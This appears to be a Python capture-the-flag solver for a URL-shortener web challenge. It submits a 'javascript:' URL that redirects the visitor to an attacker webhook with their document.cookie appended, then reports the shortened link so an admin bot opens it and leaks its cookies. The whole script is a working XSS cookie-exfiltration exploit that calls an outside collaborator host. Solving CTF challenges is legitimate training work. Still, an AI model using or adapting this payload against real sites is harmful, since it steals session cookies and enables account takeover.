import requests
import argparse
from bs4 import BeautifulSoup


def parse_args():
    parser = argparse.ArgumentParser()

    parser.add_argument(
        "--url",
        required=True,
        dest="url",
        help="target URL",
    )
    parser.add_argument(
        "--webhook_url",
        required=True,
        dest="webhook_url",
        help="collaborator url or any other webhook, https://eucm60gkp16k5w9mf8fphjcaj1psdkd82.oastify.com",
    )
    parser.add_argument(
        "--proxy",
        help="enable proxy",
        action="store_true",
        default=False,
    )

    args = parser.parse_args()
    return args


class OopsSolver:
    def __init__(self, url, webhook_url, proxy):
        self.url = url
        self.webhook_url = webhook_url
        self.proxies = {"http": "http://127.0.0.1:8080"} if proxy else {}

    @staticmethod
    def get_shortened_url(r):
        soup = BeautifulSoup(r.text, "html.parser")
        if r.status_code == 200:
            shortened_url = soup.find("input", attrs={"id": "shortenedUrl"})["value"]
            return shortened_url

    def shorten_url(self):
        payload = (
            """javascript:location.href=`webhook_url/?${document.cookie}`""".replace(
                "webhook_url", self.webhook_url
            )
        )
        data = {"original_url": payload}
        r = requests.post(f"{self.url}", data=data, proxies=self.proxies)
        self.shortened_url = self.get_shortened_url(r)
        print(f"[+] shortened_url: {self.shortened_url}")

    def report(self):
        data = {"submit_id": self.shortened_url}
        r = requests.post(f"{self.url}/report", data=data, proxies=self.proxies)
        print("[+] check collaborator for flag")

    def solve(self):
        self.shorten_url()
        self.report()


def main():
    args = parse_args()
    url = args.url
    webhook_url = args.webhook_url
    proxy = args.proxy
    OopsSolver(url, webhook_url, proxy).solve()


if __name__ == "__main__":
    main()
